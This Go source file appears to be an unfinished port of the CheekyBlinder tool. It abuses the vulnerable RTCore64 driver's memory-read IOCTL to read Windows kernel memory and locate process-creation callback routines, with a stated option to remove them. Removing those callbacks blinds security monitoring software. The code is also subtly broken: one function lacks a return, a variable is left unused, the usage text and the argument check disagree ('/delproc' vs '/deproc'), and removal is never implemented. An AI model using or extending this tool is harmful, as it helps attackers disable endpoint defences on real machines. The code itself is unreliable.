package main

// https://github.com/br-sn/CheekyBlinder - multiple code snippets were re-used here
//go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go

import (
	"fmt"
	"os"
	"unsafe"

	w32 "github.com/gonutz/w32/v2"
)

type (
	DWORD   uint32
	DWORD64 uint64
	LPVOID  uintptr
	LPDWORD *uint32
	LPCSTR  *int8
	LPCWSTR *int16
	HANDLE  uintptr
	BYTE    byte
)

//sys EnumDeviceDrivers(lpImageBase uintptr, cb uint32, lpcbNeeded *uint32) (flag bool) = psapi.EnumDeviceDrivers
//sys LoadLibraryW(lpLibFileName string) (handle uintptr) = kernel32.LoadLibraryW
//sys GetProcAddress(hModule uintptr,lpProcName string) (address uintptr) = kernel32.GetProcAddress
//sys FreeLibrary(hLibModule uintptr) (flag bool) = kernel32.FreeLibrary
//sys DeviceIoControl(hDevice uintptr, dwIoControlCode uint32, lpInBuffer uintptr, nInBufferSize uint32, lpOutBuffer uintptr, nOutBufferSize uint32,lpBytesReturned *uint32) (flag bool) = kernel32.DeviceIoControl
type Offsets struct {
	Process  DWORD64
	Image    DWORD64
	Thread   DWORD64
	Registry DWORD64
}

type Rtcore64MemoryRead struct {
	Pad0     [8]byte
	Address  DWORD64
	Pad1     [8]byte
	ReadSize DWORD
	Value    DWORD
	Pad3     [16]byte
}

var (
	RTCORE64_MEMORY_READ_CODE uint32 = 0x80002048
)

func getVersionOffsets() Offsets {
	winver := w32.RegGetString(w32.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId")
	fmt.Printf("[+] Windows Version %s Found!\n", winver)
	switch winver {
	case "1909":
		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
	case "2004":
		return Offsets{0x8b48cd0349c03345, 0xe8d78b48d90c8d48, 0xe8cd8b48f92c8d48, 0x4024448948f88b48}
	default:
		fmt.Println("[!] Version Offsets Not Found!")
		return Offsets{0, 0, 0, 0}
	}
}

func getDriverHandle() HANDLE {
	device := w32.CreateFile("\\\\.\\RTCore64", w32.GENERIC_READ|w32.GENERIC_WRITE, 0, nil, w32.OPEN_EXISTING, 0, 0)
	if device == w32.INVALID_HANDLE_VALUE {
		//need error response
		fmt.Println("[!] Unable to obtain a handle to the device object")
		return HANDLE(device)
	} else {
		fmt.Printf("[+] Device object handle obtained: %p", &device)
		return HANDLE(device)
	}
	//?
	return HANDLE(device)
}

func findkrnlbase() DWORD64 {
	var cbNeeded uint32
	cbNeeded = 0
	var drivers [1024]DWORD64
	if EnumDeviceDrivers(uintptr(unsafe.Pointer(&drivers)), 1024, &cbNeeded) {
		return drivers[0]
	}
	//need error response
	return drivers[0]
}
func getFunctionAddress(fnc string) DWORD64 {
	ntoskrnlbaseaddress := findkrnlbase()
	ntoskrnl := LoadLibraryW("ntoskrnl.exe")
	offset := DWORD64(GetProcAddress(uintptr(ntoskrnl), fnc)) - DWORD64(ntoskrnl)
	address := ntoskrnlbaseaddress + offset
	FreeLibrary(ntoskrnl)
	fmt.Println(address)
	return address
}

func readMemoryPrimitive(HANDLE HANDLE, s DWORD, adr DWORD64) DWORD {
	memRead := Rtcore64MemoryRead{}
	memRead.Address = adr
	memRead.ReadSize = s
	var bytesReturned uint32
	memSize := uint32(unsafe.Sizeof(memRead))
	DeviceIoControl(uintptr(HANDLE), RTCORE64_MEMORY_READ_CODE, uintptr(unsafe.Pointer(&memRead)), memSize, uintptr(unsafe.Pointer(&memRead)), memSize, &bytesReturned)
	return memRead.Value
}
func readMemoryDWORD(device HANDLE, adr DWORD64) DWORD64 {
	return DWORD64(readMemoryPrimitive(device, 4, adr))
}

func readMemoryDWORD64(device HANDLE, adr DWORD64) DWORD64 {
	return (readMemoryDWORD(device, adr+4) << 32) | readMemoryDWORD(device, adr)
}

func patternSearch(device HANDLE, s DWORD64, e DWORD64, p DWORD64) DWORD64 {
	r := int(e - s)
	for i := 0; i < r; i++ {
		ct := readMemoryDWORD64(device, s+DWORD64(i))
		if ct == p {
			return s + DWORD64(i)
		}
	}

}
func findProcessCallbackRoutine(r string) {
	offsets := getVersionOffsets()
	device := getDriverHandle()
	addr1 := getFunctionAddress("PsSetCreateProcessNotifyRoutine")
	addr2 := getFunctionAddress("IoCreateDriver")
	paddr := patternSearch(device, addr1, addr2, offsets.Process)
	offset := readMemoryDWORD(device, paddr-0x0c)

}

func main() {
	usage := "Usage: kernelinfector.exe OPTION\n/proc - List Process Creation Callbacks\n/delproc <address> - Remove Process Creation Callback"

	if len(os.Args) < 2 {
		fmt.Println(usage)
	} else if os.Args[1] == "/proc" {
		findProcessCallbackRoutine("")
	} else if os.Args[1] == "/deproc" && len(os.Args) == 3 {
		r := os.Args[2]
		findProcessCallbackRoutine(r)
	} else {
		fmt.Println(usage)
	}
}
